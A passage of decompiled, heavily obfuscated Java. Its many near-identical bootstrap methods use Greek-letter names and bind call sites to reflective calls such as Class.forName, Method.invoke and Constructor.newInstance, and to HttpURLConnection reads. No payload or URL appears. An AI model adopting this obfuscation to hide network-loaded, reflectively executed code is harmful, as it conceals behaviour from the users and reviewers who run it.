         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(πΣωυΠαλΜφβδΕΘαηΗΣανλεΓΙΛνΕΤιροχιΚρΗγχπΔπιηΟζσβΞχΕ = new MutableCallSite(var3.type()))).setTarget(var3);
         return πΣωυΠαλΜφβδΕΘαηΗΣανλεΓΙΛνΕΤιροχιΚρΗγχπΔπιηΟζσβΞχΕ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΕΕΒμζθΧμΤετδΑθΖΒχΥΧΚΟΓαρΓΑΚΙθΙβΦΩη(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΦξΙΘγωκολσΦΤμωεΞμΤσΗΣωωυΒΝκΚΧηοΟΦσΖΡΚθΥοδΛοΕν = new MutableCallSite(var3.type())).setTarget(var3);
         return ΦξΙΘγωκολσΦΤμωεΞμΤσΗΣωωυΒΝκΚΧηοΟΦσΖΡΚθΥοδΛοΕν;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite χφΟπΟωΔΣνρΥΧΜαΙθκΜΝσχΩΑΘωΥοΣλΘηγψφζκΜΠτΦιΘ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "getResponseCode", "()I", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΥοΕΤκυΙΓβΣγΦωαΝτσΖΓβΟμαΑΩΦμολαΡιξΙρεθΑΧψτΩη = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΥοΕΤκυΙΓβΣγΦωαΝτσΖΓβΟμαΑΩΦμολαΡιξΙρεθΑΧψτΩη;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite μΕσΞθμτχΔσγΕΡξεΠειΚΣΚδφΥονοσλαΟθρΤσ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(δαιΝαοΕΩβΑΗθΘΗΛηωοΦωδρΜψεντΜΧΕμχπΥΑΔΧΧαοΥΡΛτιρρΥζ = new MutableCallSite(var3.type()))).setTarget(var3);
         return δαιΝαοΕΩβΑΗθΘΗΛηωοΦωδρΜψεντΜΧΕμχπΥΑΔΧΧαοΥΡΛτιρρΥζ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ιΓφΖηΛΕΘδαΡσΙαοΨΓδΨΤαθυφτσΔιΝλΜΩ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(φΓΤΜΑΚοοΔΡηΒπΙγιΞδΩχΠλΝφΛΒΩζΗζωυνζΖΣΥΟΝε = new MutableCallSite(var3.type()))).setTarget(var3);
         return φΓΤΜΑΚοοΔΡηΒπΙγιΞδΩχΠλΝφΛΒΩζΗζωυνζΖΣΥΟΝε;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite βΔωφΦηΨΓζΝΗΚνωζΟΜΡθΔδΒεγΣλΞιοΥφΔφκΔΓνηχ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(δΕεΗηΓυχΔΤΩρφΜΙωΟΟΡΩΝαβδΒοχατΩιμηχΟοΜζΞΩψΩθΚΟΠΨυ = new MutableCallSite(var3.type()))).setTarget(var3);
         return δΕεΗηΓυχΔΤΩρφΜΙωΟΟΡΩΝαβδΒοχατΩιμηχΟοΜζΞΩψΩθΚΟΠΨυ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΤΘΜΑοΛβΑθπδΛτοπρΓΟΠΖΥθμΑΑαΘΥΣΨΠυΕυΨμμοΟΣονΓχ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΝΣΚΔξΩΟθΥΧρΜΟΝθζΗΩαΘΔμΖζτΜαΒΜΡΗΞΘΣοχΡζΙΗρ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΝΣΚΔξΩΟθΥΧρΜΟΝθζΗΩαΘΔμΖζτΜαΒΜΡΗΞΘΣοχΡζΙΗρ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΖΥΔβΝηΡυγηβΜΔφΥιθγΛΧΥΦΚΑθΓΦΝΥγξΔωΤλΙξΥ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΤαγΦΟΓΤΛΛμλφδθΠυΕυμΠτΥΙφντΑιΤΝωρο = new MutableCallSite(var3.type())).setTarget(var3);
         return ΤαγΦΟΓΤΛΛμλφδθΠυΕυμΠτΥΙφντΑιΤΝωρο;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΥΧηκξΔαωΖΧΤγΚΜφιΖΜΠεΚλοΕΨυγΓψΞ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΑζσΗιΖΨρΤμπΞκσΠΙΕμΠΡαωπΕξγΧΠΤμ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΑζσΗιΖΨρΤμπΞκσΠΙΕμΠΡαωπΕξγΧΠΤμ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ξΙσχΚυψλΔΡΓοψΖΑΝνΒκηΡΚζΔμΟηιΧωιηΦμ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Class", "getDeclaredConstructor", "([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (θπημΜεΨιγΣηΒΙΑΩΒΞξπρεΓωχΖΡρντΔΜδΠαθζτΞχλγχι = new MutableCallSite(var3.type())).setTarget(var3);
         return θπημΜεΨιγΣηΒΙΑΩΒΞξπρεΓωχΖΡρντΔΜδΠαθζτΞχλγχι;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ηλβΣΤΖαζνΥΖεζΟΓΜβΧΚΦΨσσΧρζωεΚγΡκΟζλΑΕψΜκβΟΒΗΙυ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.reflect.Constructor", "newInstance", "([Ljava/lang/Object;)Ljava/lang/Object;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΥαυΦΑπΙΒπνσΙΗΒψμΦΨηυΩΛΣδιηυινσΨζπψΛδπτ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΥαυΦΑπΙΒπνσΙΗΒψμΦΨηυΩΛΣδιηυινσΨζπψΛδπτ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΕηλΥΚοΥιΓΨρρπΟοιΒνψΞΗΝθρΑΠΨτΜυΡτ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.net.HttpURLConnection", "getInputStream", "()Ljava/io/InputStream;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ιφΓτΟξμαΕΚΛθνΒΠψΜΕυμγΤΧηΠορηΡΠμΩΕα = new MutableCallSite(var3.type())).setTarget(var3);
         return ιφΓτΟξμαΕΚΛθνΒΠψΜΕυμγΤΧηΠορηΡΠμΩΕα;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ημΝμΙξφΒΚΑΙχψΚΡιοΨΓΥηΕΤΔτΧνχΒπΗΚΖΠενψΖσξΔβ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.reflect.Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (πΑΑκΒδΧεΨΒβιηοΣψΒηυΗΛρθυΨΣνΤβΚυ = new MutableCallSite(var3.type())).setTarget(var3);
         return πΑΑκΒδΧεΨΒβιηοΣψΒηυΗΛρθυΨΣνΤβΚυ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite αρζτΩξαΗμκΗΞγΕΘΣδΗξτσΛΨωψδΓνΚθΜΞΖ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.reflect.Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΣΦΔΥΚοαΙκφΙοεψΖΟΔβψψΕΥΚΦπσωΡεΘΡτΑΓρΞωΨΛθ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΣΦΔΥΚοαΙκφΙοεψΖΟΔβψψΕΥΚΦπσωΡεΘΡτΑΓρΞωΨΛθ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ζΡΙΩΟΛεΙΖΚευηζωσΥΖεπποδΔωΦΘφΣινΟΦΟΞβπ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.reflect.Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (χΒαβνγΧΨνΙψνΛξΚθζΔΞτωΓτΣΗηΥΜκΕβεΚξΧΗπνΣωφβ = new MutableCallSite(var3.type())).setTarget(var3);
         return χΒαβνγΧΨνΙψνΛξΚθζΔΞτωΓτΣΗηΥΜκΕβεΚξΧΗπνΣωφβ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΓρψΘΞζξΜπΦΨΞιΧηΙθοΠΛΠωΡΚνΚΓΑσΧΑΨΙτΣΡξΗηεΩΖγΟμΡΔ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.reflect.Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΩηψΘΓΨουζψτγΙΓψοΧΧΙιρτωΗψΥφαβμζρ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΩηψΘΓΨουζψτγΙΓψοΧΧΙιρτωΗψΥφαβμζρ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΓΝΠηεΘκχφχηΒΗΜικιβκΔΥιγΘΠλβνΛΛΣχακΜιΘΛΜδΤΜζδΧ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Boolean", "booleanValue", "()Z", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(οεΕΤθΥνΛΙιθΧωνηΥΧΖΧΡΣοτΗΤΤζΑΡΤΙγψΟΦνψιξξΡνΥεβΜ = new MutableCallSite(var3.type()))).setTarget(var3);
         return οεΕΤθΥνΛΙιθΧωνηΥΧΖΧΡΣοτΗΤΤζΑΡΤΙγψΟΦνψιξξΡνΥεβΜ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΖΧξΛΩτζφογσχΤοωφαβΞγθΓηΚψΝΝπΚΙμνΗεψΟΡΧΑψΘαΑδΓΩΓΞ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΟλΡηΘΕνΙνητΓΔνΥΙρΗγβηηΨηΘρδΒΕψιΜιωφψοΝτφΕωΜΤΘΙ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΟλΡηΘΕνΙνητΓΔνΥΙρΗγβηηΨηΘρδΒΕψιΜιωφψοΝτφΕωΜΤΘΙ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΜξλκθΖΙΟηΣΨΖΕΧΧΖδΒΩεδΤζΟΡζΖηβΘκφζΦΥΜρ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(θψΝΧζΑΩΦΣΜιαγγΕΡΒΖαΩλεΠΗΧΔΚοδτΗΠΦαΙΓΞΕξΑΨ = new MutableCallSite(var3.type()))).setTarget(var3);
         return θψΝΧζΑΩΦΣΜιαγγΕΡΒΖαΩλεΠΗΧΔΚοδτΗΠΦαΙΓΞΕξΑΨ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΟρΨηπμοΕΤΓξιυοΥηθσΕΟμΒΡΝΟΒΘψΦωξΗ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (νΟΥΣΦηκσδτΖρΟεκηζνΛΘγΔπχΦΗαΘκΞΦμΛΩγδΡεΚΗΝΩυψΦΞΝΚ = new MutableCallSite(var3.type())).setTarget(var3);
         return νΟΥΣΦηκσδτΖρΟεκηζνΛΘγΔπχΦΗαΘκΞΦμΛΩγδΡεΚΗΝΩυψΦΞΝΚ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite θυμσψζΠσΜΡΤγΟδΙωχΕυΔθΔΟΟΛΗΨΥψδβΔυΞ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ιΟΩψωΨξλχθΧΙΔιΥσΥωμοΝΜωξυαΠΖηπΗθΧκΚδΤκδ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ιΟΩψωΨξλχθΧΙΔιΥσΥωμοΝΜωξυαΠΖηπΗθΧκΚδΤκδ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite γΩηΧγσιΝΛθξΚΑΚξΝσθΨμλδΑαΑΡζγΠγεΗαμΦΥΜθΧπεΧ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΤφζΦΔΩφωΥφΔχθδΡομμΞλΣΖψνγππνδΦΙΜΗΑΗΩ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΤφζΦΔΩφωΥφΔχθδΡομμΞλΣΖψνγππνδΦΙΜΗΑΗΩ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite βΑκΞπΜΓΕΦλΕΙΠΚΜεσχΦΥΡοομζηΗνπιΗΩΒΛε(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Exception", "getMessage", "()Ljava/lang/String;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΙγΜΝμτζκμλΚΣΟΤταλΞΟΨΩΕΗΦΒΦυΤΖΨπΝΧΕΩδτφΜπΞζΗτΓ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΙγΜΝμτζκμλΚΣΟΤταλΞΟΨΩΕΗΦΒΦυΤΖΨπΝΧΕΩδτφΜπΞζΗτΓ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΥΓσδΞσΜΗψΞΟΚωωχΕεΡΥΥξΟκξνθγαηΥΜΓΤσΙΟθΣΤΤΥσΧ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Exception", "getMessage", "()Ljava/lang/String;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΘζΜυΑΥΑφΑιυΓζΑΙΜεΡσΔΙβλζψΙΡΔΘσΘΧΔΣοχΟΛ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΘζΜυΑΥΑφΑιυΓζΑΙΜεΡσΔΙβλζψΙΡΔΘσΘΧΔΣοχΟΛ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite θΨθχχΡΝπΘΗφηελΡλΞχΙσΞΗΒφΣθΝδΨξσηλγλσΔινΛΦΔ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.String", "contains", "(Ljava/lang/CharSequence;)Z", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ζΨχΓΕΣαΥΣδΗδΨηΟΥλΤδΡΞβΥΚΟΙπωΝλΨζιΓζΞΛξΚξδΣχ = new MutableCallSite(var3.type())).setTarget(var3);
         return ζΨχΓΕΣαΥΣδΗδΨηΟΥλΤδΡΞβΥΚΟΙπωΝλΨζιΓζΞΛξΚξδΣχ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite δτΑρΩκΦτΤΩννΒθαΧζπΡΩΩΩγΤβσθηΘΦΞλΔΘωψΑθΙΣθΧΟ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ληΕΒηΜψχλΨΩψΣΟΖΥδρτθΤΕχδΜρΗπησΗΜγσκφΚγ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ληΕΒηΜψχλΨΩψΣΟΖΥδρτθΤΕχδΜρΗπησΗΜγσκφΚγ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΥΕφΑΖΛΣΡζΚχΝοΥαασψΦζεΣΛΝταΑΔΡπΦΚΤτρμΙΜτσαΞψλΣξτ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Exception", "getMessage", "()Ljava/lang/String;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΧΩΔνΟκιοΛΙΛτΖμΨζξΗαΞφεΘφηΡζωφατΚψθρΠΑψγρμο = new MutableCallSite(var3.type())).setTarget(var3);
         return ΧΩΔνΟκιοΛΙΛτΖμΨζξΗαΞφεΘφηΡζωφατΚψθρΠΑψγρμο;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΡιβΙΓμεΥΖΞυγΡΠηΦΝδζΣΤπηωΓψβΙωΕΙδΘΥτξΣππεωΤ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΒΚησνκψΔσσζωλΙΘΠβυφΓτυΦΨκχΔηΑΙδΟφκΙΔξλ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΒΚησνκψΔσσζωλΙΘΠβυφΓτυΦΨκχΔηΑΙδΟφκΙΔξλ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΚψξηΨΣξεΕΨΡαΟΞΩφπΞΚνΘΗχλΨωνΟΥχψγΣξφΔΠαημΤΞΙΦλχΧΠ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΙΔφΙηψδΣδΥδζΚΜΜΗΣΣΕΘΞΞΗΒρψΑΜΧΡφ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΙΔφΙηψδΣδΥδζΚΜΜΗΣΣΕΘΞΞΗΒρψΑΜΧΡφ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΛΜΗΕαΧΜυΩφΧΨεΜιΨΔμΛοιπΔτΘΦΑκΦηφσαοφκκρζΚΧιχΗΜφΓμ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(αρΥΝξυΒΒΗΘΔΚΚΟΞνΜΙυΟΙΙγαψΛνΙθΜμΛΦΧοΒηοΣωρφψφσΠΓο = new MutableCallSite(var3.type()))).setTarget(var3);
         return αρΥΝξυΒΒΗΘΔΚΚΟΞνΜΙυΟΙΙγαψΛνΙθΜμΛΦΧοΒηοΣωρφψφσΠΓο;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite γΨΟυΑΘΩζκΞμνΔγΓΞφΦΘσωτεσΓΟΩΕδιΩυ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ζγκΟΩΣψΞΙβΦΥξΚαοΡΕμΚοΦχαξμΖζγΨΞΓαπΤνΧΞγΒ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ζγκΟΩΣψΞΙβΦΥξΚαοΡΕμΚοΦχαξμΖζγΨΞΓαπΤνΧΞγΒ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite μΓΖΓΓζΛειρΟΒφΨαψρΑΙΚβΚξωσηΠδπβΔΖχμεΖΣ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Throwable", "getMessage", "()Ljava/lang/String;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (φΛΦπτθΤαμλΗζΔΛθΜΛΜφΒφρΤλΙστΡΨΦΒΨσ = new MutableCallSite(var3.type())).setTarget(var3);
         return φΛΦπτθΤαμλΗζΔΛθΜΛΜφΒφρΤλΙστΡΨΦΒΨσ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΝτΓΣυΨΡΜΑψοοΕτββεΞΘνΓΜητηΖτφΔΔεΤΨεοαγξλν(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Throwable", "getMessage", "()Ljava/lang/String;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΨΔΧΙχΞγηΖνΣΣΔΥΤυΙΝΖΜΟΒηξδΝΗωΔΝΕθτφτΠο = new MutableCallSite(var3.type())).setTarget(var3);
         return ΨΔΧΙχΞγηΖνΣΣΔΥΤυΙΝΖΜΟΒηξδΝΗωΔΝΕθτφτΠο;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΞΘηΠκτντοΣιΡφΩΞΒΝΣψηβΥΖχβΖησγΑδΘΔΥε(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.String", "contains", "(Ljava/lang/CharSequence;)Z", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (νΓΡΙωΔαΥΗδΣΕτκΔμαΜΧΕΨΓνΞσμΠΒΒωΓΜΣ = new MutableCallSite(var3.type())).setTarget(var3);
         return νΓΡΙωΔαΥΗδΣΕτκΔμαΜΧΕΨΓνΞσμΠΒΒωΓΜΣ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite κΤυψφγΥχγξΤλαυΧΦδβΨωΡΖΧΦκΑλΛκξ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Throwable", "getMessage", "()Ljava/lang/String;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(αΓΛβσΟκΠΙθΙΠΖΞΟμΩηΔΚβΛΑΨΠυΕΩνΡυΤλΣΞδφ = new MutableCallSite(var3.type()))).setTarget(var3);
